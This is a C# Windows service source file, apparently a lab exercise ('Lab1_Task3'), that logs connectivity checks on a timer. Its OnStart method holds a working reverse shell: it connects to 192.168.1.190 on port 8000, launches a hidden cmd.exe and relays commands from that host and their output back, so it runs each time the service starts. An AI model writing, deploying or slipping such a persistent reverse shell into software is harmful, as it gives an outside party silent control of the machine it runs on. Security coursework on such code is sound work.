using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.IO;
using System.Net;
using System.Net.Sockets;

namespace Lab1_Task3
{
    public partial class Service1 : ServiceBase
    {
        Timer timer = new Timer();
        public Service1()
        {
            InitializeComponent();
        }
        static StreamWriter SWriter;
        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder StrOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    StrOutput.Append(outLine.Data);
                    SWriter.WriteLine(StrOutput);
                    SWriter.Flush();
                }
                catch (Exception)
                {

                }
            }
        }
        protected override void OnStart(string[] args)
        {
            WriteToFile("Service is started at" + DateTime.Now);
            timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
            timer.Interval = 5000; //number in milisecinds 
            timer.Enabled = true;
            try
            {
                using (TcpClient client = new TcpClient("192.168.1.190", 8000))
                {
                    using (Stream Strm = client.GetStream())
                    {
                        using (StreamReader SReader = new StreamReader(Strm))
                        {
                            SWriter = new StreamWriter(Strm);

                            StringBuilder StrInput = new StringBuilder();

                            Process P = new Process();
                            P.StartInfo.FileName = "cmd.exe";
                            P.StartInfo.CreateNoWindow = true;
                            P.StartInfo.UseShellExecute = false;
                            P.StartInfo.RedirectStandardOutput = true;
                            P.StartInfo.RedirectStandardInput = true;
                            P.StartInfo.RedirectStandardError = true;
                            P.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                            P.Start();
                            P.BeginOutputReadLine();
                            while (true)
                            {
                                StrInput.Append(SReader.ReadLine());
                                P.StandardInput.WriteLine(StrInput);
                                StrInput.Remove(0, StrInput.Length);
                            }
                        }
                    }
                }
            }
            catch (Exception)
            {

            }
        }


        public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://google.com/"))
                    return true;
            }
            catch
            {
                return false;
            }
        }
        protected override void OnStop()
        {
            WriteToFile("Service is stopped at " + DateTime.Now);
        }
        private void OnElapsedTime(object source, ElapsedEventArgs e)
        {
            WriteToFile("Service is recall at " + DateTime.Now);
            bool IsConnected = CheckForInternetConnection();
            if (IsConnected)
            {
                WriteToFile("Internet is connected" + DateTime.Now);
            }
            else
            {
                WriteToFile("Internet is not connected" + DateTime.Now);
            }
        }

        public void WriteToFile(string Message)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            string filepath = AppDomain.CurrentDomain.BaseDirectory +
           "\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') +
           ".txt";
            if (!File.Exists(filepath))
            {
                // Create a file to write to. 
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
        }
    }


}
